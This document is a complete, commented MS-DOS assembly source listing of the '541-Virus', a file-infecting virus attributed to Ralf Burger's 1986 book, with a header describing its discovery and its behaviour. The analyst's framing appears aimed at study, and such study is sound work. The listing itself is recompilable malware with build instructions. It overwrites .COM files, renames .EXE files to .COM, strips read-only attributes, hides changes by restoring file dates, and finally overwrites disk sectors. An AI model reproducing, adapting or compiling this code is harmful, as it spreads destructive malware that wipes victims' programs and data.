

  
PAGE  70,120
  
;;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ         Name Virus: 541-Virus                          14 Sept 1990  ÛÛ
;;ÛÛ    Suggested Alias: NOP-Virus                                        ÛÛ
;;ÛÛ            Variant: 537-Virus, 560-Virus                             ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ      Last Reported: September 1990                                   ÛÛ
;;ÛÛ         'Isolated': The Hague, The Netherlands                       ÛÛ
;;ÛÛ                 by: Righard Zwienenberg 2:512/2.3@fidonet            ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ              Author: Ralf Burger in 1986 for his book:               ÛÛ
;;ÛÛ                      VIRUSES, A HIGH TECHNICAL DISEASE               ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ  The code of this virus was built into a MOVE-util. It was imple-    ÛÛ
;;ÛÛ  mented wrong. The virus went straight to the destruction code.      ÛÛ
;;ÛÛ  I've taken the code out and reconstructed it to its original        ÛÛ
;;ÛÛ  form. Because I had a listing of Ralf Burger's book I have placed   ÛÛ
;;ÛÛ  his own comments behind the code, although I've translated it into  ÛÛ
;;ÛÛ  English. The labels used, are also his.                             ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ  I've put three comments myself in the code. These can be recog-     ÛÛ
;;ÛÛ  nized by the starting ;; of it.                                     ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ  Edwin Cleton, the one who send me the MOVE util for examination     ÛÛ
;;ÛÛ  downloaded it from a BBS. So far there are no damage reports.       ÛÛ
;;ÛÛ  The move-util checked the system's date. If the date is 1 Aug       ÛÛ
;;ÛÛ  or later of any year, the virus was called.                         ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ This sourcelisting can be recompiled with MASM 4.0+ and A86. For     ÛÛ
;;ÛÛ compilation with A86 you must specify 'conta' and 'disks' as a word  ÛÛ
;;ÛÛ else the definition will conflict with what A86 previously thinks.   ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ Virus-Description:                                                   ÛÛ
;;ÛÛ ------------------                                                   ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ The virus infects the first COM-file in the ROOT-Directory. The      ÛÛ
;;ÛÛ virus overwrites the first 230h bytes of the file. When an infected  ÛÛ
;;ÛÛ file is executed it will infect one other .COM-file. The system will ÛÛ
;;ÛÛ crash mostly afterwards because the overwritten part is not stored.  ÛÛ
;;ÛÛ When COMMAND.COM is infected on the HDU, the system will not reboot  ÛÛ
;;ÛÛ because COMMAND.COM is complete. Each reboot COMMAND.COM will infect ÛÛ
;;ÛÛ one other .COM-File and the computer crashes. When all .COM-files    ÛÛ
;;ÛÛ are infected, .EXE-files will be renamed (FCB) to .COM to become     ÛÛ
;;ÛÛ infected. When all .COM and .EXE-files are infected, the virus will  ÛÛ
;;ÛÛ write to sectors on disk depending on the system's time.             ÛÛ
;;ÛÛ The infected files are lost en must be replaced by backup-copies.    ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛ The shortest size an infected file can be is 230h bytes. The code is ÛÛ
;;ÛÛ shorter, but this is the value which has been put into the code as   ÛÛ
;;ÛÛ the virus-length.                                                    ÛÛ
;;ÛÛ                                                                      ÛÛ
;;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  

Code            Segment
                Assume   CS:Code
progr           equ      100h
                org      progr
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; The three NOP's are set as a identifier for the virus. This way
; the virus knows this copy is already infected.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
MAIN:
                nop
                nop
                nop
        
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Init the Pointers
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ax,0
                mov        es:[pointer],ax                
                mov        es:[counter],ax                
                mov        es:[disks],al                 

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Get actual diskdrive
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,19h                   ; drive?
                int        21h                        
                                                
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Get actual path
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        cs:drive,al              ; save drive
                mov        ah,47h                   ; dir?
                mov        dh,0
                add        al,1
                mov        dl,al                    ; in actual drive?
                lea        si,cs:old_path       
                int        21h                  

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Get actual number of present diskdrives.If only one diskdrive is present,
; the pointer for 'search_order' will transfered to 'search_order + 6'
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,0Eh                   ; how many disks
                mov        dl,0
                int        21h                            
                mov        al,1
                cmp        al,1                     ; one drive?
                jne        hups3                
                mov        al,6
hups3:
                mov        ah,0
                lea        bx,cs:search_order   
                add        bx,ax
                add        bx,1
                mov        cs:pointer,bx        
                clc                             

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; The carry-flag is set if the search will find no more .COM-files. To do
; it the easy way, all .EXE-files will get the .COM-extention to become
; infected. This will result in an error if the executed .EXE is to big.
; The error-message 'Program too big to fit in memory' will be the result.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

change_disk:
                jnc        no_name_change       
                mov        ah,17h                   ; change exe to com
                lea        dx,cs:mask_exe       
                int        21h                  
                cmp        al,0FFh
                jnz        no_name_change           ; .EXE found?

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; When no .COM or .EXE-files are found, sectors will be overwritten, 
; depending from the system's time in the  msec-range. This is the moment
; that the entire disk is infected. 'VIRUS' can not infect any more and
; starts the destruction.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,2Ch                   ; read system clock
                int        21h                  
                mov        bx,cs:pointer         
                mov        al,cs:[bx]
                mov        bx,dx
                mov        cx,2
                mov        dh,0
                int        26h                      ; Write shit on disk

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Test if the end of the seek-procedure or of the table has been reached.
; If so: end.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

no_name_change:
                mov        bx,cs:pointer               
                dec        bx
                mov        cs:pointer,bx                
                mov        dl,cs:[bx]
                cmp        dl,0FFh
                jnz        hups2                
                jmp        hops                 

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Get new disk from the list with search orders and make it the actual one.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

hups2:
                mov        ah,0Eh
                int        21h                      ; change disk

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Start at the ROOT-Directory.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,3Bh                   ; change path
                lea        dx,cs:path           
                int        21h                  
                jmp        find_first_file

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Starting from the ROOT-dir, search for the first sub-dir. Previous change
; all .EXE-files into .COM-files in the old directory.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

find_first_subdir:
                mov        ah,17h                    ; change exe to com
                lea        dx,cs:mask_exe        
                int        21h                        
                mov        ah,3Bh                    ; use root dir
                lea        dx,cs:path            
                int        21h                   
                mov        ah,4Eh                    ; search for first subdir
                mov        cx,11h                    ; dir mask
                lea        dx,cs:mask_dir        
                int        21h                   
                jc         change_disk            
                mov        bx,cs:counter         
                inc        bx
                dec        bx
                jz         use_next_subdir       

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Search for the next sub-dirs. Change to other drive if no sub-dir is
; found.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

find_next_subdir:
                mov        ah,4Fh                   ; search for next sub-dir.
                int        21h                  
                jc         change_disk                
                dec        bx
                jnz        find_next_subdir        

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Change found sub-dir in actual one.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

use_next_subdir:
                mov        ah,2Fh                   ; get dta address
                int        21h                  
                add        bx,1Ch
                mov        word ptr es:[bx],'\'     ; address of name in dta 
                inc        bx
                push        ds
                mov        ax,es
                mov        ds,ax
                mov        dx,bx
                mov        ah,3Bh                   ; change path
                int        21h                  
                pop        ds
                mov        bx,cs:counter         
                inc        bx
                mov        cs:counter,bx         

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Search first .COM-file in the actual directory. If no .COM-files present,
; search the next directory.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

find_first_file:
                mov        ah,4Eh                   ; search for first
                mov        cx,1                     ; mask
                lea        dx,cs:mask_com       
                int        21h                  
                jc         find_first_subdir                       
                jmp        short check_if_ill              

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; If the file is already infected, search next file.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

find_next_file:
                mov        ah,4Fh                   ; search for next
                int        21h                  
                jc        find_first_subdir     

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Test on infection.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

check_if_ill:
                mov        ah,3Dh                   ; open channel
                mov        al,2                     ; read/write
                mov        dx,9Eh                   ; address of name in dta
                int        21h                  
                mov        bx,ax                    ; save channel
                mov        ah,3Fh                   ; read file
                mov        cx,buflen
                mov        dx,buffer                ; write in buffer
                int        21h                  
                mov        ah,3Eh                   ; close file
                int        21h                  

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Test if the three NOPs of 'VIRUS' are present. If so, the file is already
; infected, continue searching.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        bx,cs:[buffer]        
                cmp        bx,9090h
                jz         find_next_file          

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Erase the write-protection attribute from MS-DOS.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,43h                   ; write enable
                mov        al,0
                mov        dx,9Eh                   ; address of name in dta
                int        21h                  
                mov        ah,43h               
                mov        al,1
                and        cx,0FEh
                int        21h                  

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Open file for writing/reading.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,3Dh                   ; open channel
                mov        al,2                     ; read/write
                mov        dx,9Eh                   ; address of name in dta
                int        21h                  

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Store date of file for later use.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        bx,ax                    ; channel
                mov        ah,57h                   ; get date
                mov        al,0
                int        21h                  
                push        cx                      ; save data
                push        dx

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Save the original jump from program.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        dx,cs:[conta]            ; save old jmp
                mov        cs:[jmpbuf],dx        
                mov        dx,cs:[buffer+1]         ; save new jump
                lea        cx,cs:cont-100h                
                sub        dx,cx
                mov        cs:[conta],dx               

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; 'VIRUS' copies itself to the beginning of a file.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,40h                   ; write virus
                mov        cx,buflen                ; length buffer
                lea        dx,main                  ; write virus
                int        21h                  

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Restore the old file-date.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,57h                   ; write date
                mov        al,1
                pop        dx
                pop        cx                       ; restore date
                int        21h                  

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Close file.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,3Eh                   ; close file
                int        21h                  

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Restore the old jump-address. 'VIRUS' stores at address 'conta' the jump
; which was at the beginning of the host-program. This will keep the host-
; program as much executable as possible. After storing the address, it 
; works with the jumpaddress of 'VIRUS'. 'VIRUS' will thus be in the 
; work-memory of the program.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        dx,cs:[jmpbuf]           ; restore old jmp
                mov        cs:[conta],dx         
hops:
                nop
                call        use_old                        

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Continue the execution of the host-program.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ


cont            db          0e9h
conta           dw          0
                mov         ah,00
                int         21h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Activate the diskdrive choosen at the entry of the program.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

use_old:
                mov        ah,0eh                   ; use old drive
                mov        dl,cs:drive
                int        21h                        
    
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; Activate the path choosen at the entry of the program.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

                mov        ah,3Bh                   ; use old dir
                lea        dx,cs:[1FDh]             ; get old path and 
                                                    ; backslash
                int        21h                      
                ret

  
search_order    db        0FFh,1,0,2,3,0FFh,0,0FFh
pointer         dw        0000
counter         dw        0000
disks           db        0
mask_com        db        "*.com",00                ; search for com-files
mask_dir        db        "*",00                    ; search for dirs
mask_exe        db        0FFh, 0, 0, 0, 0, 0, 3Fh
                db        0,"????????exe",0,0,0,0
                db        0,"????????com",0
mask_all        db        0FFh, 0, 0, 0, 0, 0, 3Fh
                db        0,"???????????",0,0,0,0
                db        0,"????????com",0

;; mask_all is never used by the code and easilly can be ommited
;; to shorten the code

buffer          equ       0e000h                    ; a save place
buflen          equ       230h                      ; length of virus

;; At this place I disagree with Ralf. The actual length of the virus
;; is 21Dh bytes when compiled in MASM and 219h bytes when compiled
;; in A86. Because it was Ralf's intention to compile this in MASM
;; 21Dh should be the original length.

jmpbuf          equ       buffer+buflen             ; a save place for jmp
path            db        "\",0                     ; first path
drive           db        0                         ; actual drive
back_slash      db        "\"

;; This variable is never used in the code and easilly can be ommited
;; to shorten the code.

old_path        db        32 dup (?)                ; old path
  
code            ends
  
                end        main

